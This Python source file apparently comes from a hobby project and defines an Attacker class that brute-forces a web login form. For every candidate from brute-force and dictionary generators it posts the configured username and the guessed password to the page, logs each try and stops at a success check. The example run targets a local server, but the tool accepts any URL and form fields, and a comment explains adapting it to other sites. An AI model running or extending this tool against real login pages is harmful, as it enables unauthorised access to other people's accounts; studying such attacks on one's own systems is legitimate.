from PasswordCracker.PasswordAttackTypes import BruteForceAttack, DictionaryAttack
import requests


class Attacker():
    def __init__(self, url, username="username", formTags=["Username", "Password"],
                 attackMethods={"BruteForceAttack":BruteForceAttack(), "DictionaryAttack":DictionaryAttack()}):

        # url of the login page
        self.url = url

        # username of account we are trying to hack
        self.username = username

        # Layout of the login form. You can check this through inspect element. Or if you built the website you can check the code!
        self.formTags = formTags

        # By default this is set to:
        # {
        #   "Username" : "username",
        #   "Password" : "password",
        # }
        self.data = {
            formTags[0] : self.username, # username of who we are tyring to hack
            formTags[1] : "password" # dummmy password
        }

        # list of attack methods
        # You can write your own class but it must contain a generatePasswords() method that returns a list of password guesses
        self.attackMethods = attackMethods

    # runs attack on the website.
    # successful is a function that the user provides that returns whether the login succeeded or not.
    # def successful(response) -> Boolean
    # this will change for depending on how the website is constructed. For mine just check that "HELLO" is present in response.content
    def runAttack(self, checkSuccess, attackMethods=None):
        print("ATTACKING", self.url)

        pw = "NOT FOUND"
        # can specify which attack methods to use
        # if not specified, use all that are loaded in
        if not attackMethods:
            attackMethods = [name for name in self.attackMethods]

        with requests.Session() as session:


            for name, attackMethod in self.attackMethods.items():
                if name not in attackMethods:
                    continue

                print("====================================================================================\n" +
                      str(attackMethod) + "\n" +
                      "====================================================================================")
                for password in attackMethod.generatePasswords():
                    self.data[self.formTags[1]] = password
                    response = session.post(self.url, data=self.data)
                    found = checkSuccess(response)

                    print("Trying [%s] [%s] ... %s" % (self.username, password,
                                                       "SUCCESS" if found else "FAILED"))

                    if found:
                        pw = password
                        break

        return pw

    def getPasswords(self):
        result = []
        for attackMethod in self.attackMethods:
            print(attackMethod)
            result += attackMethod.generatePasswords()

        return result

    def addAttackMethod(self, method):
        self.attackMethods[type(method).__name__] = method

    def getAttackMethod(self, method):
        if method in self.attackMethods:
            return self.attackMethods[method]

if __name__ == '__main__':
    attacker = Attacker('http://127.0.0.1:5000/login')

    # This will only work for my website
    # If for some reason you want to attack another website you will have to modify this function
    def checkSuccess(response):
        return "HELLO" in response.content.decode()

    attacker.runAttack(checkSuccess)